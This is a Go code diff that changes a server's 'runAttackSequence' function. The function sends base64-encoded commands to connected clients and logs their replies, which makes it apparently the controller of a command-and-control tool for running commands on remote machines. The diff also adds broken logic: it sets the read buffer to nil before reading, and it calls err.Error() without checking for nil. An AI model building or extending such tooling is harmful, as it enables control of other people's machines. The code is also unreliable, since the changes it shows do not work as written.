@@ -69,7 +69,6 @@ func main() {
 	}
 	fmt.Println("Server Listening on port: ", PORT)
 	for {
-
 		conn, err := listener.Accept()
 		if err != nil {
 			log.Printf("Client accept error: %s", err)
@@ -169,16 +168,17 @@ func checkFlags(arguments []string, l int, cmdsToRun []string) bool {
 
 func runAttackSequence(conn net.Conn, logger *log.Logger, cmdsToRun []string) {
 	logger.Println("FILE BEGINS HERE.")
-	//buffer := make([]byte, 1024)
+	buffer := make([]byte, 1024)
 	for _, element := range cmdsToRun {
 		encodedStr := base64.StdEncoding.EncodeToString([]byte(element))
-		_, err := conn.Write([]byte(encodedStr))
 		logger.Println("EXECUTE: " + " " + element)
+		_, err := conn.Write([]byte(encodedStr))
+		
 		time.Sleep(time.Second)
-		//_, err := conn.Read(buffer)
-		//logger.Println("RES: " + string(buffer[:]))
-		//logger.Println("ERR: " + err.Error())
-
+		buffer  = nil
+		_, err = conn.Read(buffer)
+		logger.Println("RES: " + string(buffer[:]))
+		logger.Println("ERR: " + err.Error())
 		handleError(err)
 	}
 	logger.Println("\nDONE.\nFILE ENDS HERE.")
